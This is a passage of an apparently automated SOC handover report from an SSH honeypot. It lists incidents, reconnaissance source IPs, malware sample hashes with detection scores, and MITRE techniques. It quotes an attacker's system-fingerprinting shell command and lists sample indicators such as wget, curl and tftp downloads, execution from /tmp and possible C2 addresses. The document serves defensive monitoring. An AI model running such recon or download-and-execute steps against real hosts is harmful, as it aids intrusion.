| `2026-07-06 14:46:26` | `cowrie.command.input` |
| `2026-07-06 14:46:26` | `cowrie.command.input` |
| `2026-07-06 14:46:26` | `cowrie.command.input` |
| `2026-07-06 14:46:29` | `cowrie.log.closed` |
| `2026-07-06 14:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb01c3d087e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:47 |
| **Last Seen** | 2026-07-06 14:48 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:47:28` | `cowrie.session.connect` |
| `2026-07-06 14:47:35` | `cowrie.client.version` |
| `2026-07-06 14:47:35` | `cowrie.client.kex` |
| `2026-07-06 14:47:59` | `cowrie.login.success` |
| `2026-07-06 14:48:08` | `cowrie.session.params` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:08` | `cowrie.command.success` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:08` | `cowrie.command.input` |
| `2026-07-06 14:48:11` | `cowrie.log.closed` |
| `2026-07-06 14:48:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d7ffe125a4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:49 |
| **Last Seen** | 2026-07-06 14:49 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:49:05` | `cowrie.session.connect` |
| `2026-07-06 14:49:12` | `cowrie.client.version` |
| `2026-07-06 14:49:12` | `cowrie.client.kex` |
| `2026-07-06 14:49:35` | `cowrie.login.success` |
| `2026-07-06 14:49:47` | `cowrie.session.params` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:47` | `cowrie.command.success` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:47` | `cowrie.command.input` |
| `2026-07-06 14:49:54` | `cowrie.log.closed` |
| `2026-07-06 14:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b3182f8d35

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 14:49 |
| **Last Seen** | 2026-07-06 14:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:49:08` | `cowrie.session.connect` |
| `2026-07-06 14:49:09` | `cowrie.client.version` |
| `2026-07-06 14:49:09` | `cowrie.client.kex` |
| `2026-07-06 14:49:15` | `cowrie.login.success` |
| `2026-07-06 14:49:19` | `cowrie.session.params` |
| `2026-07-06 14:49:19` | `cowrie.command.input` |
| `2026-07-06 14:49:20` | `cowrie.log.closed` |
| `2026-07-06 14:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f57fc5114c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:51 |
| **Last Seen** | 2026-07-06 14:51 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:51:00` | `cowrie.session.connect` |
| `2026-07-06 14:51:04` | `cowrie.client.version` |
| `2026-07-06 14:51:04` | `cowrie.client.kex` |
| `2026-07-06 14:51:20` | `cowrie.login.success` |
| `2026-07-06 14:51:34` | `cowrie.session.params` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:34` | `cowrie.command.success` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:34` | `cowrie.command.input` |
| `2026-07-06 14:51:41` | `cowrie.log.closed` |
| `2026-07-06 14:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a01ac82c0619

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:52 |
| **Last Seen** | 2026-07-06 14:53 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:52:43` | `cowrie.session.connect` |
| `2026-07-06 14:52:45` | `cowrie.client.version` |
| `2026-07-06 14:52:45` | `cowrie.client.kex` |
| `2026-07-06 14:53:09` | `cowrie.login.success` |
| `2026-07-06 14:53:20` | `cowrie.session.params` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:20` | `cowrie.command.success` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:20` | `cowrie.command.input` |
| `2026-07-06 14:53:27` | `cowrie.log.closed` |
| `2026-07-06 14:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **61** | 2026-07-06 12:56 | 2026-07-06 14:54 | 63m | 0 | `T1592` | 🟠 MEDIUM |
| `130.211.64[.]11` | **60** | 2026-07-06 13:56 | 2026-07-06 14:22 | 29m | 0 | `T1592` | 🟠 MEDIUM |
| `34.76.219[.]107` | **30** | 2026-07-06 13:46 | 2026-07-06 13:46 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.138[.]198` | **18** | 2026-07-06 13:04 | 2026-07-06 14:48 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `206.81.2[.]201` | **15** | 2026-07-06 12:59 | 2026-07-06 14:54 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **9** | 2026-07-06 12:55 | 2026-07-06 14:50 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-06 13:00 | 2026-07-06 14:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **5** | 2026-07-06 12:56 | 2026-07-06 12:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.134.157[.]132` | **5** | 2026-07-06 14:15 | 2026-07-06 14:19 | 6m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]218` | **3** | 2026-07-06 13:34 | 2026-07-06 13:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `113.31.104[.]188` | **2** | 2026-07-06 14:31 | 2026-07-06 14:33 | 2m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **2** | 2026-07-06 13:39 | 2026-07-06 13:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **2** | 2026-07-06 14:21 | 2026-07-06 14:22 | 1m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]176` | **2** | 2026-07-06 13:45 | 2026-07-06 14:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.34.86[.]19` | 1 | 2026-07-06 13:53 | 2026-07-06 13:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.196.66[.]80` | 1 | 2026-07-06 13:43 | 2026-07-06 13:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-06 13:05 | 2026-07-06 13:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.14[.]197` | 1 | 2026-07-06 14:34 | 2026-07-06 14:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-07-06 13:33 | 2026-07-06 13:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-07-06 13:33 | 2026-07-06 13:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `46.151.182[.]31` | 1 | 2026-07-06 13:48 | 2026-07-06 13:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-06 14:52 | 2026-07-06 14:53 | 38s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]99` | 1 | 2026-07-06 14:35 | 2026-07-06 14:36 | 16s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-06 12:58 | 2026-07-06 12:58 | 36s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]7` | 1 | 2026-07-06 13:31 | 2026-07-06 13:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]8` | 1 | 2026-07-06 13:19 | 2026-07-06 13:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]2` | 1 | 2026-07-06 13:42 | 2026-07-06 13:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]33` | 1 | 2026-07-06 13:39 | 2026-07-06 13:39 | 3s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]34` | 1 | 2026-07-06 13:39 | 2026-07-06 13:39 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **37/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `129.121.47[.]136` | BR | Oso Grande IP Services, LLC | **100** ⚠️ | 13 |
| `34.76.219[.]107` | BE | Google LLC | **100** ⚠️ | 0 |
| `121.200.49[.]221` | IN | Wireless Solution India Pvt Ltd. | **100** ⚠️ | 5 |
| `193.164.155[.]115` | LV | as56971 network | **100** ⚠️ | 2 |
| `172.236.228[.]218` | US | Linode | **100** ⚠️ | 50 |
| `113.31.104[.]188` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 34 |
| `8.134.157[.]132` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 15 |
| `66.132.172[.]99` | US | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 196 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 181 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 122 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 122 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 122 |

---

## 🔕 False Positive Summary (0 filtered)

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 415 cases |
| Tool 34  | Credential Extractor        | ✅ 218 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 43 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 0 filtered (0.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

